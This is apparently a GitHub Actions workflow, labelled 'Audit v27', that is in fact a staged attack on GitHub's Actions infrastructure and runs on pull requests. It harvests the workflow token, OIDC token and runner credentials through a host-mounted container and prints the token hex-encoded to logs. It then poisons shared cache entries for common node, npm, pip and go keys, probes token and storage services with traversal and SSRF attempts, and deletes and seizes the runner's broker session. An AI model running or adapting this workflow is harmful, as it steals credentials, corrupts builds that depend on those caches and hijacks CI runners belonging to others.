name: Audit v27
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v27:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V27 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "IDTOK_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"

          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: COMPLETE CACHE POISON CHAIN
      # v26: CreateCacheEntry=200 with signed_upload_url!
      # Now: upload poisoned data → finalize → verify readable
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Cache poison chain
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== CACHE POISON CHAIN ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          RESULTS="https://results-receiver.actions.githubusercontent.com"

          # Cache keys that upstream workflows typically use
          KEYS=("setup-node-v4-node-20-linux-x64" "npm-cache-linux-x64" "pip-linux-x64" "go-build-linux-x64" "v27-proof")
          for KEY in "${KEYS[@]}"; do
            VER=$(echo -n "$KEY" | sha256sum | cut -d' ' -f1)
            echo "--- KEY=$KEY VER=$VER ---"

            # Step 1: Create entry
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              "$RESULTS/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
              -d "{\"key\":\"$KEY\",\"version\":\"$VER\"}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "CREATE = $CODE | $(echo "$BODY" | head -c 400)"

            UPLOAD_URL=$(echo "$BODY" | jq -r '.signed_upload_url // empty' 2>/dev/null)
            if [ -n "$UPLOAD_URL" ]; then
              echo "UPLOAD_URL obtained ($(echo "$UPLOAD_URL" | wc -c) chars)"

              # Step 2: Upload poisoned data to Azure Blob
              POISON_DATA="V27-CACHE-POISON-PROOF: key=$KEY timestamp=$(date -u +%Y%m%dT%H%M%SZ)"
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PUT \
                -H "Content-Type: application/octet-stream" \
                -H "x-ms-blob-type: BlockBlob" \
                "$UPLOAD_URL" \
                --data-binary "$POISON_DATA")
              CODE=$(echo "$R" | tail -1)
              echo "UPLOAD = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

              # Step 3: Finalize
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
                "$RESULTS/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload" \
                -d "{\"key\":\"$KEY\",\"version\":\"$VER\",\"size_bytes\":${#POISON_DATA}}")
              CODE=$(echo "$R" | tail -1)
              echo "FINALIZE = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

              # Step 4: Verify — can we read it back?
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
                "$RESULTS/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
                -d "{\"key\":\"$KEY\",\"version\":\"$VER\"}")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "VERIFY = $CODE | $(echo "$BODY" | head -c 400)"

              DL_URL=$(echo "$BODY" | jq -r '.signed_download_url // empty' 2>/dev/null)
              if [ -n "$DL_URL" ]; then
                CONTENT=$(/usr/bin/curl -sS "$DL_URL" | head -c 200)
                echo "DOWNLOAD CONTENT: $CONTENT"
              fi
            fi
            echo ""
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: TokenIssue service + full parent scope exploration
      # v26: parent has 17 areas including TokenIssue at vstoken
      # SSRF via signed blob URL patterns
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - TokenIssue + traversal + SSRF
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== TOKENISSUE + TRAVERSAL + SSRF ==="
          RT=$(cat /tmp/rt.txt)
          IDTOK=$(cat /tmp/idtok.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)

          # A: TokenIssue service at vstoken
          echo "--- A: TokenIssue ---"
          VSTOKEN="https://vstoken.actions.githubusercontent.com"
          for TOK_NAME in RT CTOK IDTOK; do
            eval TOK=\$$TOK_NAME
            [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
            echo "== $TOK_NAME =="
            for EP in \
              "/" \
              "/_apis/connectionData" \
              "/_apis/Token/Session" \
              "/_apis/Token/SessionTokens" \
              "/_apis/Token/Create" \
              "/_apis/Token/Revoke" \
              "/_apis/Token/Refresh" \
              "/serviceDeployments/tokenghubeus21/" \
              "/serviceDeployments/tokenghubeus21/_apis/connectionData" \
              "/serviceDeployments/tokenghubeus21/_apis/Token/Session" \
              "/serviceDeployments/tokenghubeus21/_apis/Token/Create" \
              "/serviceDeployments/tokenghubeus21/_apis/Token/SessionTokens"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" "$VSTOKEN$EP" 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "  $EP = $CODE | $(echo "$BODY" | head -c 250)"
            done
          done
          echo ""

          # B: Full list of all 17 parent scope resource areas
          echo "--- B: Parent 17 areas full dump ---"
          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "$BASE/../_apis/resourceareas")
          echo "$R" | jq -c '.value[]? | {name, id, locationUrl}' 2>/dev/null
          echo ""

          # C: Hit locationUrl from EACH of the 17 areas
          echo "--- C: Each area locationUrl ---"
          echo "$R" | jq -r '.value[]? | .locationUrl' 2>/dev/null | sort -u | while read LOC; do
            [ -z "$LOC" ] && continue
            for EP in "_apis/connectionData" "_apis/resourceareas"; do
              RR=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $RT" "${LOC}${EP}" 2>/dev/null)
              CODE=$(echo "$RR" | tail -1)
              IID=$(echo "$RR" | sed '$d' | jq -r '.instanceId // empty' 2>/dev/null)
              [ "$CODE" != "HTTP_000" ] && echo "  $LOC $EP = $CODE iid=$IID"
            done
          done
          echo ""

          # D: SSRF via Azure Blob URL patterns
          echo "--- D: Azure Blob SSRF ---"
          BLOB_BASE="https://productionresultssa11.blob.core.windows.net"
          for EP in \
            "/" \
            "/actions-cache" \
            "/actions-cache?restype=container&comp=list" \
            "/?comp=list" \
            "/actions-results" \
            "/actions-results?restype=container&comp=list" \
            "/actions-artifacts" \
            "/actions-artifacts?restype=container&comp=list"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              "$BLOB_BASE$EP" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "  $EP = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # E: Try other storage account names
          echo "--- E: Other storage accounts ---"
          for N in $(seq 1 15); do
            for PREFIX in "productionresultssa" "githubactionscachessa"; do
              ACCOUNT="${PREFIX}${N}"
              R=$(/usr/bin/curl -sS -o /dev/null -w "%{http_code}" --connect-timeout 2 -m 3 \
                "https://${ACCOUNT}.blob.core.windows.net/?comp=list" 2>/dev/null)
              [ "$R" != "000" ] && echo "  $ACCOUNT = $R"
            done
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: Broker session takeover
      # v26: DELETE=204 (deleted!), POST=409 (exists)
      # Strategy: delete existing session, create new one, poll messages
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Broker session takeover
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== BROKER SESSION TAKEOVER ==="
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          BROKER="https://broker.actions.githubusercontent.com"
          [ -z "$CTOK" ] || [ ${#CTOK} -lt 10 ] && { echo "NO CTOK"; exit 0; }

          # A: Check current session status
          echo "--- A: Session status ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
            "$BROKER/session" -d '{}')
          CODE=$(echo "$R" | tail -1)
          echo "A POST session = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          # B: Delete the existing session
          echo "--- B: Delete session ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X DELETE \
            -H "Authorization: Bearer $CTOK" "$BROKER/session")
          CODE=$(echo "$R" | tail -1)
          echo "B DELETE = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # C: Create a new session
          echo "--- C: Create session ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
            "$BROKER/session" -d '{}')
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "C POST session = $CODE | $(echo "$BODY" | head -c 400)"

          # D: If session created, try to poll for messages
          echo "--- D: Poll messages ---"
          # GET /message with long poll
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 8 \
            -H "Authorization: Bearer $CTOK" "$BROKER/message")
          CODE=$(echo "$R" | tail -1)
          echo "D GET message = $CODE | $(echo "$R" | sed '$d' | head -c 400)"

          # E: Check what methods message supports now
          echo "--- E: Message methods ---"
          for METHOD in GET POST PUT DELETE; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -X $METHOD \
              -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
              "$BROKER/message" -d '{}')
            CODE=$(echo "$R" | tail -1)
            echo "E $METHOD message = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
          done

          # F: Try runner lifecycle endpoints
          echo "--- F: Lifecycle ---"
          for EP in "renew" "status" "heartbeat" "acquire" "complete" "release"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -X POST \
              -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
              "$BROKER/$EP" -d '{}')
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "F $EP = $CODE | $(echo "$BODY" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Deep traversal on all services
      # Apply traversal to vstoken, pipelines canonical, blob storage
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Deep traversal
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== DEEP TRAVERSAL ==="
          RT=$(cat /tmp/rt.txt)
          IDTOK=$(cat /tmp/idtok.txt)

          # A: vstoken traversal
          echo "--- A: vstoken traversal ---"
          VSTOKEN="https://vstoken.actions.githubusercontent.com"
          for P in \
            "/../" \
            "/../../" \
            "/serviceDeployments/" \
            "/serviceDeployments/../" \
            "/serviceDeployments/tokenghubeus21/../" \
            "/serviceDeployments/tokenghubeus21/../../"; do
            for EP in "_apis/connectionData" "_apis/resourceareas"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $RT" "$VSTOKEN$P$EP" 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "A $P$EP = $CODE | $(echo "$BODY" | head -c 200)"
            done
          done
          echo ""

          # B: Canonical pipeline traversal — find the other 5 resource areas
          echo "--- B: Canonical deep ---"
          CANON="https://pipelines.actions.githubusercontent.com"
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "$CANON/../_apis/resourceareas")
          echo "B canonical ../ areas:"
          echo "$R" | jq -c '.value[]? | {name, locationUrl}' 2>/dev/null | head -20
          echo ""

          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "$CANON/$SECRET/../_apis/resourceareas")
          echo "B canonical secret/.. areas:"
          echo "$R" | jq -c '.value[]? | {name, locationUrl}' 2>/dev/null | head -20

      # ══════════════════════════════════════════════════════════════
      # STEP 6: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 6 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V27 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V27 COMPLETE ==="
